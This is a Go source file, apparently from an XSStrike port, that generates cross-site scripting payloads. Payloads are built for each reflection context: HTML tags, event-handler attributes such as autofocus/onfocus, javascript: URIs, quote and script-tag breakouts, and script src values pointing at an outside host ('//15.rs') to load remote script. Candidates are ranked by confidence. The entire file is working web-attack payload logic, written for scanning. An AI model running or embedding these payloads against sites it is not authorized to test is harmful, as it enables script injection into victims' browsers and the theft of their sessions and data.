package reflection

import (
	"math/rand"
	"sort"
	"strings"

	"github.com/Sakura-501/XSStrike-go/internal/config"
	"github.com/Sakura-501/XSStrike-go/internal/payload"
	"github.com/Sakura-501/XSStrike-go/internal/utils"
)

func GenerateCandidates(occurrences Occurrences, response string) map[int][]string {
	scripts := utils.ExtractReflectedScripts(response, config.XSSChecker)
	index := 0
	rng := rand.New(rand.NewSource(37))

	buckets := map[int]map[string]struct{}{}
	for i := 1; i <= 11; i++ {
		buckets[i] = map[string]struct{}{}
	}

	for _, pos := range occurrences.Positions() {
		occ := occurrences[pos]
		context := occ.Context
		details := occ.Details

		switch context {
		case "html":
			less := occ.Score["<"]
			greater := occ.Score[">"]
			ends := []string{"//"}
			if greater == 100 {
				ends = append(ends, ">")
			}
			if less > 0 {
				for _, v := range genericVectors(ends, details.BadTag, rng) {
					buckets[10][v] = struct{}{}
				}
			}
		case "attribute":
			found := false
			quote := details.Quote
			quoteEfficiency := 100
			if quote != "" {
				if score, ok := occ.Score[quote]; ok {
					quoteEfficiency = score
				}
			}
			greater := occ.Score[">"]
			ends := []string{"//"}
			if greater == 100 {
				ends = append(ends, ">")
			}

			if greater == 100 && quoteEfficiency == 100 {
				for _, v := range genericVectors(ends, "", rng) {
					buckets[9][quote+">"+v] = struct{}{}
					found = true
				}
			}

			if quoteEfficiency == 100 {
				for _, filling := range config.DefaultFillings {
					for _, function := range config.DefaultFunctions {
						vector := quote + filling + randomUpper("autofocus", rng) + filling + randomUpper("onfocus", rng) + "=" + quote + function
						buckets[8][vector] = struct{}{}
						found = true
					}
				}
			}

			if quoteEfficiency == 90 {
				for _, filling := range config.DefaultFillings {
					for _, function := range config.DefaultFunctions {
						vector := "\\" + quote + filling + randomUpper("autofocus", rng) + filling + randomUpper("onfocus", rng) + "=" + function + filling + "\\" + quote
						buckets[7][vector] = struct{}{}
						found = true
					}
				}
			}

			if details.Type == "value" {
				if details.Name == "srcdoc" {
					if occ.Score["&lt;"] > 0 {
						localEnds := append([]string{}, ends...)
						if occ.Score["&gt;"] > 0 {
							localEnds = []string{"%26gt;"}
						}
						for _, v := range genericVectors(localEnds, "", rng) {
							buckets[9][strings.ReplaceAll(v, "<", "%26lt;")] = struct{}{}
							found = true
						}
					}
				} else if details.Name == "href" && details.Value == config.XSSChecker {
					for _, function := range config.DefaultFunctions {
						buckets[10][randomUpper("javascript:", rng)+function] = struct{}{}
						found = true
					}
				} else if strings.HasPrefix(details.Name, "on") {
					closer := JSContexter(details.Value)
					q := ""
					if idx := strings.Index(details.Value, config.XSSChecker); idx >= 0 {
						tail := details.Value[idx+len(config.XSSChecker):]
						for _, ch := range tail {
							if ch == '\'' || ch == '"' || ch == '`' {
								q = string(ch)
								break
							}
						}
					}
					suffix := "//\\"
					for _, filling := range config.DefaultJFillings {
						for _, function := range config.DefaultFunctions {
							vector := q + closer + filling + function + suffix
							if found {
								buckets[7][vector] = struct{}{}
							} else {
								buckets[9][vector] = struct{}{}
							}
						}
					}
					if quoteEfficiency > 83 {
						suffix = "//"
						for _, filling := range config.DefaultJFillings {
							for _, function := range config.DefaultFunctions {
								fn := function
								if strings.Contains(fn, "=") {
									fn = "(" + fn + ")"
								}
								localFilling := filling
								if q == "" {
									localFilling = ""
								}
								vector := "\\" + q + closer + localFilling + fn + suffix
								if found {
									buckets[7][vector] = struct{}{}
								} else {
									buckets[9][vector] = struct{}{}
								}
							}
						}
					}
				} else if details.Tag == "script" || details.Tag == "iframe" || details.Tag == "embed" || details.Tag == "object" {
					if (details.Name == "src" || details.Name == "iframe" || details.Name == "embed") && details.Value == config.XSSChecker {
						buckets[10]["//15.rs"] = struct{}{}
						buckets[10][`\/\\\/\15.rs`] = struct{}{}
					} else if details.Tag == "object" && details.Name == "data" && details.Value == config.XSSChecker {
						for _, function := range config.DefaultFunctions {
							buckets[10][randomUpper("javascript:", rng)+function] = struct{}{}
						}
					} else if quoteEfficiency == 100 && greater == 100 {
						for _, v := range genericVectors(ends, "", rng) {
							buckets[11][quote+">"+randomUpper("</script/>", rng)+v] = struct{}{}
							found = true
						}
					}
				}
			}
		case "comment":
			less := occ.Score["<"]
			greater := occ.Score[">"]
			ends := []string{"//"}
			if greater == 100 {
				ends = append(ends, ">")
			}
			if less == 100 {
				for _, v := range genericVectors(ends, "", rng) {
					buckets[10][v] = struct{}{}
				}
			}
		case "script":
			if len(scripts) == 0 {
				continue
			}
			script := scripts[0]
			if index < len(scripts) {
				script = scripts[index]
			}
			closer := JSContexter(script)
			quote := details.Quote
			scriptEfficiency := occ.Score["</scRipT/>"]
			greater := occ.Score[">"]
			breakerEfficiency := 100
			if quote != "" {
				if score, ok := occ.Score[quote]; ok {
					breakerEfficiency = score
				}
			}
			ends := []string{"//"}
			if greater == 100 {
				ends = append(ends, ">")
			}
			if scriptEfficiency == 100 {
				for _, v := range genericVectors(ends, "", rng) {
					buckets[10][v] = struct{}{}
				}
			}
			if closer != "" {
				suffix := "//\\"
				for _, filling := range config.DefaultJFillings {
					for _, function := range config.DefaultFunctions {
						buckets[7][quote+closer+filling+function+suffix] = struct{}{}
					}
				}
			} else if breakerEfficiency > 83 {
				prefix := ""
				if breakerEfficiency != 100 {
					prefix = "\\"
				}
				suffix := "//"
				for _, filling := range config.DefaultJFillings {
					for _, function := range config.DefaultFunctions {
						fn := function
						if strings.Contains(fn, "=") {
							fn = "(" + fn + ")"
						}
						localFilling := filling
						if quote == "" {
							localFilling = ""
						}
						buckets[6][prefix+quote+closer+localFilling+fn+suffix] = struct{}{}
					}
				}
			}
			index++
		}
	}

	out := map[int][]string{}
	for confidence, set := range buckets {
		items := make([]string, 0, len(set))
		for v := range set {
			items = append(items, v)
		}
		sort.Strings(items)
		out[confidence] = items
	}
	return out
}

func genericVectors(ends []string, badTag string, rng *rand.Rand) []string {
	return payload.GenerateVectors(payload.GeneratorInput{
		Fillings:      config.DefaultFillings,
		EFillings:     config.DefaultEFillings,
		LFillings:     config.DefaultLFillings,
		EventHandlers: config.DefaultEventHandlers,
		Tags:          config.DefaultTags,
		Functions:     config.DefaultFunctions,
		Ends:          ends,
		BadTag:        badTag,
		Bait:          config.XSSChecker,
	}, rng)
}

func randomUpper(input string, rng *rand.Rand) string {
	return payload.RandomUpper(input, rng)
}
